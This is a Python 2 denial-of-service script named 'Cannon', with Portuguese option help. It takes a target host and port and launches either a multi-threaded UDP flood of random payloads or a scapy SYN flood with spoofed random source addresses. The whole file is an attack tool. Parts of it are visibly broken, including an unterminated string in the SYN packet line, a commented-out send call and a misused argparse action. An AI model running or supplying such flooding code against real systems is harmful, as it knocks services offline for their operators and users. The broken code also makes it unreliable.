#!/usr/bin/python
# -*- coding: utf-8 -*-

import argparse
import threading
from scapy.all import *
import scapy



def main():
    global target
    global port
    parser = argparse.ArgumentParser(description = "Cannon", add_help = False)
    parser.add_argument('-h', '--help', action=usage(), help='usage')
    parser.add_argument('-t', '--target',help='Informe o Alvo')
    parser.add_argument('-p', '--port',help='Informe a porta do alvo')
    parser.add_argument('-i', '--interface',help='Informe a interface para o ataque')
    parser.add_argument('-s', '--service',help='Informe o tipo do ataque syn, udp e etc')
    parser.add_argument('-T', '--thread',help='Threads')


    args = parser.parse_args()

    target  = args.target
    port    = int(args.port)
    thread = args.thread
    service = args.service
    interface = args.interface
    #capy.conf.iface = interface

    #DEFAULT OPTIONS
    if service is None:
        service = 'syn'

    if thread is None:
        thread = 1

    if interface is None:
        interface = 'eth0'

    if service == 'syn':
        synflood(target, port, thread, interface)

    elif service == 'udp':
        udpflood(target, port, thread)



    else:
        usage()

def usage():
    print 'user ./cannon.py -t 192.168.1.100 -p 80 -s syn'


#UDP FLOOD TEST
def udpflood(target, port, thread):
    thread = int(thread)
    for a in range(thread):
        t = threading.Thread(target=udp_attack)
        t.start()

def udp_attack():
    i = 1
    while True:
        try:
            #Simple Raw Socket
            conn = socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
            data = random._urandom(1024)

            #Simple Connection UDP
            conn.sendto(data,(target,port))
            i = i + 1
            print '[!] SEND %s PACKETS TO %s:%s' % (i, target, port)

        except:
            print '[x] ERROR TO SEND DATA TO %s:%s' % (target, port)



def synflood(target, port, thread, interface):
        while True:
            try:
                scapy.conf.iface = interface
                i = scapy.IP()
                i.src = "%i.%i.%i.%i" % (random.randint(1,254),random.randint(1,254),random.randint(1,254),random.randint(1,254))
                i.dst = target
                t = scapy.TCP()
                t.sport = random.randint(1,65535)
                t.dport = port
                t.flags = 'S'
                p=IP(dst=target,id=1111,ttl=99)/TCP(sport=RandShort(),dport=[port],seq=12345,ack=1000,window=1000,flags="S")/"H
                #scapy.send(i/t, verbose=0)

            except:
                print '[X] ERROR TO SEND SYN ATTACK'
main()